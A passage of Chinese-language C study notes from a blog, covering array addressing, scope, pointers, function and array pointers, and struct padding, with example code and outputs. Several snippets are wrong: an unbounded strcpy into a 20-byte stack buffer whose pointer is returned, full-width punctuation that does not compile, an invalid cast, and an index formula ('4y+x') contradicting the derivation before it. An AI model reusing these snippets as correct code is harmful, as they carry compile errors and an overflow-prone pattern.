<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">goto</span> NEXT;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">NEXT:</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    foo();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6、二维数组"><a href="#6、二维数组" class="headerlink" title="6、二维数组"></a>6、二维数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//多维数组是特殊的一维数组，它里面的元素是数组</span></span><br><span class="line"><span class="comment">//N维数组</span></span><br><span class="line">ary[n] address:</span><br><span class="line">	(<span class="type">int</span>)ary + <span class="keyword">sizeof</span>(type)*n</span><br><span class="line"></span><br><span class="line">type ary[N][M]</span><br><span class="line">ary[x][y] address；</span><br><span class="line">     (<span class="type">int</span>)ary + <span class="keyword">sizeof</span>(type[M])*x   <span class="comment">// &amp;ary[x]</span></span><br><span class="line">              + <span class="keyword">sizeof</span>(type)*y      <span class="comment">// &amp;ary[x][y]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ary[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">	&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">	&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">	&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> x = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,&amp;ary[x][y]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,&amp;ary[x][<span class="number">4</span>*x+y]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,(<span class="type">int</span>)ary + <span class="keyword">sizeof</span>(<span class="type">int</span>[<span class="number">4</span>])*x + <span class="keyword">sizeof</span>(<span class="type">int</span>)*y);</span><br></pre></td></tr></table></figure>



<p>内存是一维存储，二维数组只有一个首地址，可以用一维数组访问到二维数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type ary[N][M]</span><br><span class="line">ary[x][y] address；</span><br><span class="line">(int)ary + sizeof(type[M])*x + sizeof(type)*y</span><br><span class="line">(int)ary + sizeof(type)*M*x + sizeof(type)*y</span><br><span class="line">(int)ary + sizeof(type)*(M*x + y)</span><br><span class="line"></span><br><span class="line">ary[3][4]，从ary[0]开始访问</span><br><span class="line">其实就是 4y+x</span><br></pre></td></tr></table></figure>



<p>自定义strcpy实现对比</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mystrcpy</span><span class="params">(<span class="type">char</span> szDst[],<span class="type">char</span> szSrc[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>；</span><br><span class="line">    <span class="keyword">while</span> (szSrc[i]！=<span class="string">&#x27;\0&#x27;</span>)  <span class="comment">// 字符数组中&#x27;\0&#x27;表示结束符</span></span><br><span class="line">    &#123;</span><br><span class="line">        szDst[i] = szSrc[i];</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    szDst[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// while(szDst[i++] = szSrc[i]);</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<h2 id="7、-作用域"><a href="#7、-作用域" class="headerlink" title="7、 作用域"></a>7、 作用域</h2><p>全局变量的初始化与否会影响编译文件的大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> g_nTest = <span class="number">0x87654093</span>;</span><br><span class="line"><span class="type">char</span> g_szBuf[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> g_szTest[] = <span class="string">&quot;jjyy&quot;</span>;</span><br><span class="line"><span class="type">int</span> g_nTest2[<span class="number">0x10000</span>];  <span class="comment">//int g_nTest2[0x10000]=&#123;1&#125;;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Fun</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> stc_nTest = <span class="number">123</span>;</span><br><span class="line">    stc_nTest++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,stc_nTest);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Fun(<span class="number">10</span>);</span><br><span class="line">    Fun(<span class="number">20</span>);</span><br><span class="line">    Fun(<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析每种不同的变量，内存中定义</p>
<p>名称粉碎</p>
<p>汇编代码、内存、寄存器</p>
<p>变量放到寄存器，汇编里看不到？？</p>
<p>0042开头，全局变量</p>
<p>19ff2c，栈地址</p>
<h2 id="8、-地址和指针"><a href="#8、-地址和指针" class="headerlink" title="8、 地址和指针"></a>8、 地址和指针</h2><p>*取值<br>&amp;取地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> *pa = <span class="literal">NULL</span>;</span><br><span class="line">pa = &amp;a;</span><br><span class="line">*pa = <span class="number">999</span>;  <span class="comment">//不能直接赋值指针</span></span><br></pre></td></tr></table></figure>

<p>指针和数组的区别<br>数组在定义时已经明确类型，指针存放的是地址，还需要附带解释方式，即类型sizeof(type)</p>
<p>指针效率小于等于数组</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> flt = <span class="number">3.14f</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,*(<span class="type">int</span> *)&amp;flt);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,*(<span class="type">int</span>)flt);</span><br></pre></td></tr></table></figure>

<h3 id="是否交换判定"><a href="#是否交换判定" class="headerlink" title="是否交换判定"></a>是否交换判定</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myswap</span><span class="params">(<span class="type">int</span> *pn1,<span class="type">int</span> *pn2)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> *nTmp = pn1;</span><br><span class="line">	pn1 = pn2;</span><br><span class="line">	pn2 = nTmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">myswap2</span><span class="params">(<span class="type">int</span> *pn1,<span class="type">int</span> *pn2)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> nTmp = *pn1;</span><br><span class="line">	*pn1 = pn2[<span class="number">0</span>];</span><br><span class="line">	pn2[<span class="number">0</span>] = nTmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n1 = <span class="number">8</span>;</span><br><span class="line">    <span class="type">int</span> n2 = <span class="number">10</span>;</span><br><span class="line">    myswap(&amp;n1,&amp;n2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符串指针"><a href="#字符串指针" class="headerlink" title="字符串指针"></a>字符串指针</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> szTest[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *pszTest = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">szTest[<span class="number">0</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">pszTest[<span class="number">0</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line"><span class="built_in">puts</span>(szTest);</span><br><span class="line"><span class="built_in">puts</span>(pszTest);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>修改常量区可读写;</p>
<p>打开二进制文件，查找rdata字符串，下两行的40，修改为C0</p>
<h3 id="附带"><a href="#附带" class="headerlink" title="附带"></a>附带</h3><p>局部变量区会变化，基本上默认C那些都是，之后就是三个寄存器。再之后才是函数传参</p>
<h2 id="9、函数指针、数组指针"><a href="#9、函数指针、数组指针" class="headerlink" title="9、函数指针、数组指针"></a>9、函数指针、数组指针</h2><h3 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">foo</span><span class="params">(<span class="type">char</span> szBuf[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(szBuf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(szBuf));</span><br><span class="line">    <span class="comment">//int ary[200];</span></span><br><span class="line">	<span class="type">char</span> szBuf2[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(szBuf2,szBuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(szBuf2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(szBuf2));</span><br><span class="line">    <span class="comment">//返回的是临时变量，可能被重新分配</span></span><br><span class="line">    <span class="keyword">return</span> szBuf2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szBuf1[] = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* szBuf2 = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(szBuf1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(szBuf2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(szBuf1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(szBuf2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="string">&quot;Hello world!&quot;</span>));</span><br><span class="line">    </span><br><span class="line">	<span class="type">char</span> *psz = foo(szBuf1);</span><br><span class="line">    <span class="built_in">puts</span>(psz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(psz));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(psz));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-C/12.png" class title="This is an example image">

<h3 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SortA</span><span class="params">(<span class="type">int</span> ary[], <span class="type">int</span> nCount)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;冒泡法&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SortB</span><span class="params">(<span class="type">int</span> ary[], <span class="type">int</span> nCount)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;选择法&quot;</span>);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(_cdecl*PFNSORT)</span><span class="params">(<span class="type">int</span> [], <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ary[<span class="number">54</span>];</span><br><span class="line">    <span class="comment">//函数的类型</span></span><br><span class="line">    <span class="comment">//1、参数序列（包括参数个数，类型，顺序）</span></span><br><span class="line">    <span class="comment">//2、调用约定</span></span><br><span class="line">    <span class="comment">//3、返回值类型</span></span><br><span class="line">    PFNSORT pfn = <span class="literal">NULL</span>;</span><br><span class="line">    pfn = SortB;</span><br><span class="line">    <span class="comment">//(*prnSort)(ary,54)</span></span><br><span class="line">    pfn(ary,<span class="number">54</span>);</span><br><span class="line"></span><br><span class="line">    pfn = SortA;</span><br><span class="line">    pfn(ary,<span class="number">54</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">意义:</span></span><br><span class="line"><span class="comment">1、函数指针，便于换</span></span><br><span class="line"><span class="comment">放在服务端，根据当前情况请求不同</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="10、指针和多维数组"><a href="#10、指针和多维数组" class="headerlink" title="10、指针和多维数组"></a>10、指针和多维数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ary[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;,</span><br><span class="line">        &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 数组名是第0个元素的指针常量</span></span><br><span class="line">    <span class="comment">// 二维数组的元素是一维数组</span></span><br><span class="line">    <span class="comment">// int ary[3][4]的元素是 int[4]</span></span><br><span class="line">    <span class="comment">// ary是int[4]类型的指针常量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// *ary得到int[4]一维数组</span></span><br><span class="line">    <span class="comment">// *ary是int类型的指针常量</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *ary);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 任何类型的变量取地址得到该类型的指针</span></span><br><span class="line">    <span class="comment">// &amp;ary取地址得到int[3][4]类型的指针</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, &amp;ary);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ary是int[4]类型的指针常量</span></span><br><span class="line">    <span class="comment">// ary + 1 &lt;==&gt; (int)ary + sizeof(int[4])*1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// *ary是int类型的指针常量</span></span><br><span class="line">    <span class="comment">// *ary + 1 &lt;==&gt; (int)*ary + sizeof(int)*1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *ary + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &amp;ary取地址得到int[3][4]类型的指针</span></span><br><span class="line">    <span class="comment">// &amp;ary + 1 &lt;==&gt; (int)&amp;ary + sizeof(int[3][4])*1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, &amp;ary + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 二维数组的元素是一维数组</span></span><br><span class="line">    <span class="comment">// ary[0]是int[4]数组</span></span><br><span class="line">    <span class="comment">// 数组名是第0个元素的指针常量</span></span><br><span class="line">    <span class="comment">// ary[0]是int类型的指针常量</span></span><br><span class="line">    <span class="comment">// ary[0] + 1 &lt;==&gt; (int)ary[0] + sizeof(int)*1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary[<span class="number">0</span>] + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 指针加整形得到同类型的指针常量</span></span><br><span class="line">    <span class="comment">// ary是int[4]类型的指针常量</span></span><br><span class="line">    <span class="comment">// ary+1得到int[4]类型的指针常量</span></span><br><span class="line">    <span class="comment">// *(ary+1)得到一维数组int[4]</span></span><br><span class="line">    <span class="comment">// 数组名是第8个元素的指针常量</span></span><br><span class="line">    <span class="comment">// *(ary+1)是int类型的指针常量</span></span><br><span class="line">    <span class="comment">// 对int*做[1]运算得到int</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, (*(ary + <span class="number">1</span>))[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">00000001</span></span><br><span class="line"><span class="comment">0019FF10</span></span><br><span class="line"><span class="comment">0019FF04</span></span><br><span class="line"><span class="comment">0019FF30</span></span><br><span class="line"><span class="comment">0019FF04</span></span><br><span class="line"><span class="comment">00000014</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ary[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;,</span><br><span class="line">        &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> (*p)[<span class="number">4</span>] = ary;</span><br><span class="line">    <span class="type">int</span> (*pAry)[<span class="number">3</span>][<span class="number">4</span>] = &amp;ary;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, pAry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *pAry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, **pAry);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, p + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *p + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, pAry + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *pAry + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, **pAry + <span class="number">1</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF10</span></span><br><span class="line"><span class="comment">0019FF04</span></span><br><span class="line"><span class="comment">0019FF30</span></span><br><span class="line"><span class="comment">0019FF10</span></span><br><span class="line"><span class="comment">0019FF04</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(*envp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(*envp);</span><br><span class="line">        envp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(argv[i]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="type">char</span> *aryPoint[<span class="number">3</span>] = &#123;</span><br><span class="line">        <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">        <span class="string">&quot;world&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C++&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-C/13.png" class title="This is an example image">

<h2 id="11、结构体"><a href="#11、结构体" class="headerlink" title="11、结构体"></a>11、结构体</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> szName[<span class="number">5</span>];</span><br><span class="line">	<span class="type">int</span> nAge;</span><br><span class="line">	<span class="type">float</span> fHeight;</span><br><span class="line">	<span class="type">double</span> dblWeight;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> wID;</span><br><span class="line">	<span class="type">char</span> nGender;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span> <span class="title">stu</span> =</span> &#123;</span><br><span class="line">		<span class="string">&quot;Jack&quot;</span>, <span class="comment">//5个字节但是8位对齐所以补充到8？</span></span><br><span class="line">		<span class="number">25</span>,     <span class="comment">//4个字节</span></span><br><span class="line">		<span class="number">185.0f</span>, <span class="comment">//4个字节</span></span><br><span class="line">		<span class="number">80.0</span>,   <span class="comment">//8个字节</span></span><br><span class="line">		<span class="number">9527</span>,   <span class="comment">//2个字节</span></span><br><span class="line">		<span class="string">&#x27;m&#x27;</span>     <span class="comment">//1个字节</span></span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	char szName[5] = &quot;Jack&quot;;</span></span><br><span class="line"><span class="comment">	int nAge = 25;</span></span><br><span class="line"><span class="comment">	float fHeight = 185.0f;</span></span><br><span class="line"><span class="comment">	double dblWeight = 80.0;</span></span><br><span class="line"><span class="comment">	unsigned short int wID = 9527;</span></span><br><span class="line"><span class="comment">	char nGende = &#x27;m&#x27;;</span></span><br><span class="line"><span class="comment">	printf(&quot;%d\r\n&quot;,sizeof(szName));   //5</span></span><br><span class="line"><span class="comment">	printf(&quot;%d\r\n&quot;,sizeof(nAge));     //4</span></span><br><span class="line"><span class="comment">	printf(&quot;%d\r\n&quot;,sizeof(fHeight));  //4</span></span><br><span class="line"><span class="comment">	printf(&quot;%d\r\n&quot;,sizeof(dblWeight));//8</span></span><br><span class="line"><span class="comment">	printf(&quot;%d\r\n&quot;,sizeof(wID));      //2</span></span><br><span class="line"><span class="comment">	printf(&quot;%d\r\n&quot;,sizeof(nGende));   //1</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(stu));      <span class="comment">//32</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> szName[<span class="number">5</span>];</span><br><span class="line">    <span class="type">char</span> nGender;</span><br><span class="line">	<span class="type">int</span> nAge;</span><br><span class="line">    <span class="type">double</span> dblWeight;</span><br><span class="line">	<span class="type">float</span> fHeight;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> wID;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span> <span class="title">stu</span> =</span> &#123;</span><br><span class="line">		<span class="string">&quot;Jack&quot;</span>, </span><br><span class="line">         <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">		<span class="number">25</span>,  </span><br><span class="line">         <span class="number">80.0</span>, </span><br><span class="line">		<span class="number">185.0f</span>, </span><br><span class="line">		<span class="number">9527</span> </span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(stu)); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> szName[<span class="number">5</span>];</span><br><span class="line">    <span class="type">char</span> nGender;</span><br><span class="line">    <span class="type">double</span> dblWeight;</span><br><span class="line">	<span class="type">int</span> nAge;</span><br><span class="line">	<span class="type">float</span> fHeight;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> wID;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagStudent</span> <span class="title">stu</span> =</span> &#123;</span><br><span class="line">		<span class="string">&quot;Jack&quot;</span>, </span><br><span class="line">         <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">         <span class="number">80.0</span>, </span><br><span class="line">		<span class="number">25</span>,  </span><br><span class="line">		<span class="number">185.0f</span>, </span><br><span class="line">		<span class="number">9527</span> </span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(stu)); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



